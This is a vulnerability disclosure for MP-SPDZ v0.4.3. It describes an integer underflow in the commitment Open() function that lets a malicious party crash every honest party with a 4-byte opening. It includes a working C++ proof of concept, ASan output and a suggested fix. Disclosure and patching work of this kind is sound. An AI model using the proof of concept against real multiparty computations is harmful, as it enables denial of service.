# MP-SPDZ v0.4.3: Integer Underflow (size_t) in Commitment Open() via Truncated Opening — Remote Crash

- **Vulnerability type**: Integer Underflow / Wrap-around (CWE-191) leading to unbounded
  allocation (CWE-770) and potential out-of-bounds read
- **Affected product**: MP-SPDZ v0.4.3
- **Affected components**: `Tools/Commit.cpp` (`Open`), used by
  `Tools/Subroutines.cpp` (`Create_Random_Seed`, `Open_Challenge`, `Commit_And_Open_`) and
  `FHEOffline/FHE-Subroutines.cpp` — i.e. every MAC-check challenge generation, collaborative
  coin flip (`GlobalPRNG`), and FHE offline subprotocol
- **Severity**: Medium (CVSS 3.1 estimate: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

## Summary

The commitment-opening verifier `Open()` assumes every opening contains at least
`sizeof(int) + SEED_SIZE` bytes (player id + randomness) but never checks it. A malicious party
can commit to a 4-byte opening containing only its player id. The commitment is self-consistent
(`comm = hash(open)`), so verification passes, after which
`message.append(open.consume(0), open.left() - SEED_SIZE)` computes `0 - 16` in `size_t`,
underflowing to `0xFFFFFFFFFFFFFFE0` (~16 EiB) and flowing into `octetStream::append`'s
resize/memcpy. One malformed broadcast message crashes every honest party.

## Root Cause

```cpp
// Tools/Commit.cpp:14-34
bool Open(octetStream& message, const octetStream& comm, octetStream& open, int send_player)
{
    octetStream h = open.hash();
    int open_player;
    try { open_player = open.get<int>(); }           // needs only 4 bytes
    catch (exception& e) { throw invalid_commitment(send_player, e.what()); }

    if (!(h.equals(comm) && open_player == send_player))
        throw invalid_commitment(send_player);
    message.reset_write_head();
    message.append(open.consume(0), open.left() - SEED_SIZE);   // line 33: UNDERFLOW
    return true;
}
```

`open.left()` is `size_t` (Tools/octetStream.h:120); with a 4-byte opening, after reading the
id, `left() == 0`, so `left() - SEED_SIZE` (16) wraps to `SIZE_MAX - 15`. The commitment
construction imposes no length requirement:

```cpp
// Tools/Commit.cpp:6-11 — comm = hash(open) over arbitrary attacker-chosen bytes
open.store(send_player);
open.append(message.get_data(), message.get_length());
open.append_random(SEED_SIZE);
comm = open.hash();
```

Reachable call flows (all attacker-controlled broadcast paths):

```
Create_Random_Seed()   Tools/Subroutines.cpp:161   — MAC-check challenge / GlobalPRNG seed
Open_Challenge()       Tools/Subroutines.cpp:118-123
Commit_And_Open_()     Tools/Subroutines.cpp:186-191 — MAC-check commit-and-open
FHEOffline/FHE-Subroutines.cpp:19                    — FHE offline subprotocols
```

## Attack Preconditions

- A malicious protocol party during any phase that exchanges commitment openings (which occurs
  in every MAC check and every collaborative randomness generation). No other capability is
  needed.

## Impact

- Remote denial of service: a single malformed broadcast triggers a ~16 EiB allocation
  (`bad_alloc`) or a wild resize/memcpy on **every honest party**, crashing the computation.
- The fault occurs before any meaningful content authentication (the commitment is
  self-consistent), so no higher-layer check prevents it.
- If the allocation were somehow to succeed, corrupted bytes would be XORed into the
  collaborative random seed.

## Proof of Concept (dynamically verified)

Minimal PoC linking the real MP-SPDZ objects, reproducing the exact call used by
`Create_Random_Seed` (`poc12_commit.cpp`, ASan build):

```cpp
#include "Tools/Commit.h"
#include "Tools/octetStream.h"
#include "Tools/random.h"     // SEED_SIZE

int main()
{
    octetStream open;
    open.store(1);                    // 4-byte player id only, no randomness
    octetStream comm = open.hash();   // self-consistent commitment (same as a real attacker)
    octetStream open2 = open, msg;
    fprintf(stderr, "[*] opening length = %zu bytes (SEED_SIZE = %d)\n",
            open2.get_length(), SEED_SIZE);
    Open(msg, comm, open2, 1);        // identical call to the production path
}
```

**Observed (verbatim):**

```
[*] opening length = 4 bytes (SEED_SIZE = 16)
==1149==ERROR: AddressSanitizer: requested allocation size 0xffffffffffffffe0
    #0 operator new[](unsigned long)
    #1 octetStream::resize_precise(unsigned long)      Tools/octetStream.h:320
    #2 octetStream::resize(unsigned long)              Tools/octetStream.h:309
    #3 octetStream::append(unsigned long)              Tools/octetStream.h:365
    #4 octetStream::append(unsigned char const*, ...)  Tools/octetStream.h:373
    #5 Open(octetStream&, octetStream const&, ...)     Tools/Commit.cpp:33
==1149==ABORTING
```

The requested size `0xffffffffffffffe0` matches the theoretical `0 - 16 (size_t)` exactly, and
the stack trace pinpoints `Commit.cpp:33`. In a live run, a malicious party achieves the same
effect by broadcasting a 4-byte opening during any seed/challenge opening round.

## Static Verification

```bash
sed -n 14,34p Tools/Commit.cpp     # no minimum-length check; left() is size_t
sed -n 6,12p Tools/Commit.cpp      # commitment imposes no length requirement
sed -n 118,123p Tools/octetStream.h  # left() returns size_t
```

## Suggested Fix

Validate structure before use in `Open()`:

```cpp
if (open.get_length() < sizeof(int) + SEED_SIZE)
    throw invalid_commitment(send_player, "opening too short");
```

and compute the message length only after that check.

## References

- MP-SPDZ repository: https://github.com/data61/MP-SPDZ

## Discoverer

*(to be filled by reporter)*
